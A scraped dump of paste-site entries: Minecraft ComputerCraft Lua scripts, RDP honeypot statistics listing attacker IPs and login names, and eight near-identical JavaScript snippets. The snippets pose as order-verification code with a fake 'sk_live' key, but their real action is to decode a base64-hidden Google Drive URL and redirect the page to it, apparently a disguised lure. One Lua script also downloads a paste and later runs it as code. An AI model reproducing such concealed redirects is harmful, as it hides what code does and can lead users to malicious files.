id,title,username,language,date,content
5Rii0q9u,智能简化激光护盾 可用,jaklsfjlsak,Lua,Saturday 29th of March 2025 10:17:31 PM CDT,"local OffsetValue = -3
local shield = peripheral.find(""warpdriveForceFieldProjector"")
local lasers = peripheral.getNames()
local lever = ""front""
local lastLx, lastLy, lastLz = 0, 0, 0

-- Calculate the offset position (still using OffsetValue)
function shieldOffset(lx, ly, lz, fx, fy, fz)
    local dx = lx - fx
    local dy = ly - fy
    local dz = lz - fz
    local distance = math.sqrt(dx * dx + dy * dy + dz * dz)
    dx = dx / distance
    dy = dy / distance
    dz = dz / distance
    local t1x = lx + dx * OffsetValue
    local t1y = ly + dy * OffsetValue
    local t1z = lz + dz * OffsetValue
    return t1x, t1y, t1z, distance
end

-- Download configuration file if missing.
if not fs.exists(""conf"") then
    shell.run(""pastebin get 38M5cNbZ conf"")
    term.clear()
end

-- Filter peripherals: keep only warpdriveLaserCameras and set their beam frequency.
for i = #lasers, 1, -1 do
    if peripheral.getType(lasers[i]) ~= ""warpdriveLaserCamera"" then
        table.remove(lasers, i)
    else
        peripheral.wrap(lasers[i]).beamFrequency(1420)
    end
end

print(""Control System Online, Toggle Redstone To Toggle Shields, Press C to Configure"")

-- Determine shield range based on upgrades.
local _, upgrades = shield.getUpgrades()
local Size
if upgrades:match(""1/4 x Range"") then
    Size = 16
elseif upgrades:match(""2/4 x Range"") then
    Size = 32
elseif upgrades:match(""3/4 x Range"") then
    Size = 48
elseif upgrades:match(""4/4 x Range"") then
    Size = 64
elseif upgrades:match(""0/4 x Range"") then
    Size = 0
end

while true do
    local event, keyOrLaser, lx, ly, lz, block, _, _, _, type, metadata, resistance = os.pullEvent()

    if event == ""laserScanning"" then
        lastLx, lastLy, lastLz = tonumber(lx), tonumber(ly), tonumber(lz)
        local fx, fy, fz = shield.getLocalPosition()
        local t1x, t1y, t1z, distance = shieldOffset(lastLx, lastLy, lastLz, fx, fy, fz)

        local tx = (t1x - fx) / Size
        local ty = (t1y - fy) / Size
        local tz = (t1z - fz) / Size

        shield.translation(tx, ty, tz)
        print(""Laser Coordinates: ("" .. lastLx .. "", "" .. lastLy .. "", "" .. lastLz .. "")"")
        print(""Translated to: ("" .. tx .. "", "" .. ty .. "", "" .. tz .. "")"")
        
    elseif event == ""redstone"" then
        local on = redstone.getAnalogInput(lever)
        if on > 6 then
            shield.enable(true)
        elseif on < 5 then
            shield.enable(false)
        end
    elseif event == ""key"" and keyOrLaser == 46 then
        print(""C key pressed, running 'conf' script..."")
        shell.run(""conf"")
    end
end
"
mZ4U3UsA,Untitled,carubi,Lua,Saturday 29th of March 2025 10:05:57 PM CDT,"-- Beispielskript für einen Touchscreen in Computercraft (Tekkit Lite, Minecraft 1.4.7)
-- Voraussetzung: Ein Monitor ist an einer Seite des Computers angebracht.
-- Falls dein Monitor an einer anderen Seite hängt, ändere ""left"" entsprechend.
local monitor = peripheral.wrap(""left"")
if not monitor then
  print(""Kein Monitor gefunden! Bitte überprüfe die Verkabelung."")
  return
end
 
-- Funktion zum Zeichnen des Menüs
local function drawMenu()
  monitor.clear()
  monitor.setCursorPos(1,1)
  monitor.write(""== Touchscreen Menü =="")
  monitor.setCursorPos(1,3)
  monitor.write(""1. Option 1"")
  monitor.setCursorPos(1,4)
  monitor.write(""2. Option 2"")
  monitor.setCursorPos(1,5)
  monitor.write(""3. Beenden"")
end
 
drawMenu()
 
local running = true
while running do
  -- Warten auf eine Berührung auf dem Monitor
  local event, side, x, y = os.pullEvent(""monitor_touch"")
 
  -- Prüfen, ob die Berührung in einer der Menüzeilen erfolgte:
  if y == 3 then
    monitor.clear()
    monitor.setCursorPos(1,1)
    monitor.write(""Option 1 gewählt!"")
    sleep(2)
    drawMenu()
  elseif y == 4 then
    monitor.clear()
    monitor.setCursorPos(1,1)
    monitor.write(""Option 2 gewählt!"")
    sleep(2)
    drawMenu()
  elseif y == 5 then
    running = false
  end
end
 
monitor.clear()
monitor.setCursorPos(1,1)
monitor.write(""Programm beendet."")"
2yyWmr2s,Order.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 09:54:31 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/190/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XdgjChkY,Market.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 09:39:08 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/823/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
xswEdEJT,Untitled,Epiphemeral,JavaScript,Saturday 29th of March 2025 09:23:46 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/013/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
VhMirpQQ,Order.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 08:53:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/816/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
Vid2BD9A,Market.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 08:37:39 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/577/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5XKhtcYi,Untitled,Epiphemeral,JavaScript,Saturday 29th of March 2025 08:22:16 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/500/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
XVYFyyda,Order.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 07:51:30 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/581/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
nauuRmnc,Market.js,Epiphemeral,JavaScript,Saturday 29th of March 2025 07:36:01 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/684/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
BiF6s8Jh,2025-03-28_stats.json,rdp_snitch,JSON,Saturday 29th of March 2025 07:18:49 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 42849,
    ""138.199.24.6"": 91545,
    ""150.95.89.149"": 10653,
    ""156.146.57.52"": 10716,
    ""156.146.57.174"": 10704,
    ""106.14.144.233"": 423,
    ""146.190.105.191"": 1881,
    ""188.166.250.11"": 6,
    ""58.218.199.219"": 30,
    ""103.228.37.126"": 561,
    ""185.42.12.5"": 12,
    ""175.210.79.116"": 60,
    ""198.235.24.64"": 9,
    ""92.255.57.86"": 3,
    ""157.245.104.150"": 9,
    ""147.182.229.114"": 201,
    ""80.94.95.90"": 6,
    ""138.199.24.23"": 2016,
    ""194.180.49.233"": 9747,
    ""58.186.207.71"": 24,
    ""198.235.24.121"": 9,
    ""71.6.134.235"": 30,
    ""167.94.146.62"": 3,
    ""103.75.183.173"": 24,
    ""88.214.25.124"": 6,
    ""91.238.181.93"": 6,
    ""85.215.198.96"": 3,
    ""147.185.132.147"": 9,
    ""178.20.129.235"": 3,
    ""66.235.169.197"": 6,
    ""205.210.31.75"": 9,
    ""187.234.232.99"": 6
  },
  ""asn"": {
    ""AS212238"": 64269,
    ""AS60068"": 93561,
    ""AS135161"": 10653,
    ""AS37963"": 423,
    ""AS14061"": 2097,
    ""AS4134"": 30,
    ""AS135918"": 561,
    ""AS59425"": 12,
    ""AS4766"": 60,
    ""AS396982"": 36,
    ""AS207566"": 3,
    ""AS204428"": 6,
    ""AS201814"": 9747,
    ""AS18403"": 24,
    ""AS10439"": 30,
    ""AS398705"": 3,
    ""AS151858"": 24,
    ""AS35042"": 6,
    ""AS49434"": 6,
    ""AS8560"": 3,
    ""AS24810"": 3,
    ""AS40244"": 6,
    ""AS8151"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 64269,
    ""DataCamp Limited"": 93561,
    ""GMO-Z.COM PTE. LTD."": 10653,
    ""Hangzhou Alibaba Advertising Co"": 423,
    ""DigitalOcean, LLC"": 2097,
    ""Chinanet"": 30,
    ""DXT"": 561,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Korea Telecom"": 60,
    ""Google LLC"": 36,
    ""SS-Net"": 6,
    ""MEVSPACE sp. z o.o."": 9747,
    ""FPT Telecom Company"": 24,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 3,
    ""BQT"": 24,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""IONOS SE"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""HopOne Internet Corporation"": 6,
    ""Uninet S.A. de C.V."": 6
  },
  ""org"": {
    ""Datacamp Limited"": 64269,
    ""Cdn77 SGP"": 93561,
    ""Zcom Thai"": 10653,
    ""Aliyun Computing Co., LTD"": 423,
    ""DigitalOcean, LLC"": 2091,
    ""Digitalocean"": 6,
    ""Chinanet JS"": 30,
    ""DXT Digital Transformation Technology Joint Stock Company"": 561,
    ""Horizon LLC"": 12,
    ""Kornet"": 60,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unmanaged LTD"": 6,
    ""HostSlick"": 9747,
    ""Vietnam Internet Network Information Center"": 24,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 3,
    ""Unknown"": 24,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""De Ber Ionos Cloud Txl"": 3,
    ""Teleset LLC"": 3,
    ""Tier.Net Technologies LLC"": 6,
    ""UNINET"": 6
  },
  ""regionName"": {
    ""North West"": 157830,
    ""Tokyo"": 10653,
    ""Shanghai"": 423,
    ""South West"": 1887,
    ""Jiangsu"": 30,
    ""Hanoi"": 561,
    ""Moscow"": 15,
    ""Incheon"": 60,
    ""California"": 237,
    ""Karnataka"": 9,
    ""Sofia-Capital"": 6,
    ""Bavaria"": 9747,
    ""Ho Chi Minh"": 48,
    ""Nevada"": 30,
    ""Hesse"": 6,
    ""Kowloon City"": 6,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 3,
    ""New York"": 6,
    ""Hidalgo"": 6
  },
  ""country"": {
    ""Singapore"": 159717,
    ""Japan"": 10653,
    ""China"": 453,
    ""Vietnam"": 609,
    ""Russia"": 18,
    ""South Korea"": 60,
    ""United States"": 273,
    ""India"": 9,
    ""Bulgaria"": 6,
    ""Germany"": 9753,
    ""Hong Kong"": 6,
    ""France"": 6,
    ""Mexico"": 6
  },
  ""account"": {
    ""hello"": 181455,
    ""Test"": 33,
    ""LSpaamYmD"": 3,
    ""jrlBAI"": 3,
    ""DXYrwA"": 3,
    ""Administr"": 9,
    ""CSmFihUnv"": 3,
    ""uenPPA"": 3,
    ""LTYHjo"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 3,
    ""Domain"": 3,
    ""XLOEULRFz"": 3,
    ""wJlLfy"": 3,
    ""WlmOwX"": 3,
    ""DxCRuCDVx"": 3,
    ""MCQMrW"": 3,
    ""AebBsa"": 3
  },
  ""keyboard"": {
    ""Unknown"": 181569
  },
  ""client_build"": {
    ""Unknown"": 181569
  },
  ""client_name"": {
    ""Unknown"": 181569
  },
  ""ip_type"": {
    ""hosting & proxy"": 160374,
    ""hosting"": 10710,
    ""proxy"": 45,
    ""Unknown"": 10440
  }
}"
XUwwZFCk,2025-03-28_stats.json,rdp_snitch,JSON,Saturday 29th of March 2025 07:16:37 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 42848,
    ""138.199.24.6"": 91543,
    ""150.95.89.149"": 10653,
    ""156.146.57.52"": 10716,
    ""156.146.57.174"": 10704,
    ""106.14.144.233"": 423,
    ""146.190.105.191"": 1881,
    ""188.166.250.11"": 6,
    ""58.218.199.219"": 30,
    ""103.228.37.126"": 561,
    ""185.42.12.5"": 12,
    ""175.210.79.116"": 60,
    ""198.235.24.64"": 9,
    ""92.255.57.86"": 3,
    ""157.245.104.150"": 9,
    ""147.182.229.114"": 201,
    ""80.94.95.90"": 6,
    ""138.199.24.23"": 2016,
    ""194.180.49.233"": 9747,
    ""58.186.207.71"": 24,
    ""198.235.24.121"": 9,
    ""71.6.134.235"": 30,
    ""167.94.146.62"": 3,
    ""103.75.183.173"": 24,
    ""88.214.25.124"": 6,
    ""91.238.181.93"": 6,
    ""85.215.198.96"": 3,
    ""147.185.132.147"": 9,
    ""178.20.129.235"": 3,
    ""66.235.169.197"": 6,
    ""205.210.31.75"": 9,
    ""187.234.232.99"": 6
  },
  ""asn"": {
    ""AS212238"": 64268,
    ""AS60068"": 93559,
    ""AS135161"": 10653,
    ""AS37963"": 423,
    ""AS14061"": 2097,
    ""AS4134"": 30,
    ""AS135918"": 561,
    ""AS59425"": 12,
    ""AS4766"": 60,
    ""AS396982"": 36,
    ""AS207566"": 3,
    ""AS204428"": 6,
    ""AS201814"": 9747,
    ""AS18403"": 24,
    ""AS10439"": 30,
    ""AS398705"": 3,
    ""AS151858"": 24,
    ""AS35042"": 6,
    ""AS49434"": 6,
    ""AS8560"": 3,
    ""AS24810"": 3,
    ""AS40244"": 6,
    ""AS8151"": 6
  },
  ""isp"": {
    ""Datacamp Limited"": 64268,
    ""DataCamp Limited"": 93559,
    ""GMO-Z.COM PTE. LTD."": 10653,
    ""Hangzhou Alibaba Advertising Co"": 423,
    ""DigitalOcean, LLC"": 2097,
    ""Chinanet"": 30,
    ""DXT"": 561,
    ""Chang Way Technologies Co. Limited"": 15,
    ""Korea Telecom"": 60,
    ""Google LLC"": 36,
    ""SS-Net"": 6,
    ""MEVSPACE sp. z o.o."": 9747,
    ""FPT Telecom Company"": 24,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 3,
    ""BQT"": 24,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Datacenter location PAR1 France"": 6,
    ""IONOS SE"": 3,
    ""Teleset LLC Nchelny Branch"": 3,
    ""HopOne Internet Corporation"": 6,
    ""Uninet S.A. de C.V."": 6
  },
  ""org"": {
    ""Datacamp Limited"": 64268,
    ""Cdn77 SGP"": 93559,
    ""Zcom Thai"": 10653,
    ""Aliyun Computing Co., LTD"": 423,
    ""DigitalOcean, LLC"": 2091,
    ""Digitalocean"": 6,
    ""Chinanet JS"": 30,
    ""DXT Digital Transformation Technology Joint Stock Company"": 561,
    ""Horizon LLC"": 12,
    ""Kornet"": 60,
    ""Palo Alto Networks, Inc"": 36,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Unmanaged LTD"": 6,
    ""HostSlick"": 9747,
    ""Vietnam Internet Network Information Center"": 24,
    ""CariNet, Inc."": 30,
    ""Censys, Inc."": 3,
    ""Unknown"": 24,
    ""ThinkTech Technology Industrial CO. Limited"": 12,
    ""De Ber Ionos Cloud Txl"": 3,
    ""Teleset LLC"": 3,
    ""Tier.Net Technologies LLC"": 6,
    ""UNINET"": 6
  },
  ""regionName"": {
    ""North West"": 157827,
    ""Tokyo"": 10653,
    ""Shanghai"": 423,
    ""South West"": 1887,
    ""Jiangsu"": 30,
    ""Hanoi"": 561,
    ""Moscow"": 15,
    ""Incheon"": 60,
    ""California"": 237,
    ""Karnataka"": 9,
    ""Sofia-Capital"": 6,
    ""Bavaria"": 9747,
    ""Ho Chi Minh"": 48,
    ""Nevada"": 30,
    ""Hesse"": 6,
    ""Kowloon City"": 6,
    ""\u00cele-de-France"": 6,
    ""Tatarstan Republic"": 3,
    ""New York"": 6,
    ""Hidalgo"": 6
  },
  ""country"": {
    ""Singapore"": 159714,
    ""Japan"": 10653,
    ""China"": 453,
    ""Vietnam"": 609,
    ""Russia"": 18,
    ""South Korea"": 60,
    ""United States"": 273,
    ""India"": 9,
    ""Bulgaria"": 6,
    ""Germany"": 9753,
    ""Hong Kong"": 6,
    ""France"": 6,
    ""Mexico"": 6
  },
  ""account"": {
    ""hello"": 181452,
    ""Test"": 33,
    ""LSpaamYmD"": 3,
    ""jrlBAI"": 3,
    ""DXYrwA"": 3,
    ""Administr"": 9,
    ""CSmFihUnv"": 3,
    ""uenPPA"": 3,
    ""LTYHjo"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""(empty)"": 3,
    ""Domain"": 3,
    ""XLOEULRFz"": 3,
    ""wJlLfy"": 3,
    ""WlmOwX"": 3,
    ""DxCRuCDVx"": 3,
    ""MCQMrW"": 3,
    ""AebBsa"": 3
  },
  ""keyboard"": {
    ""Unknown"": 181566
  },
  ""client_build"": {
    ""Unknown"": 181566
  },
  ""client_name"": {
    ""Unknown"": 181566
  },
  ""ip_type"": {
    ""hosting & proxy"": 160371,
    ""hosting"": 10710,
    ""proxy"": 45,
    ""Unknown"": 10440
  }
}"
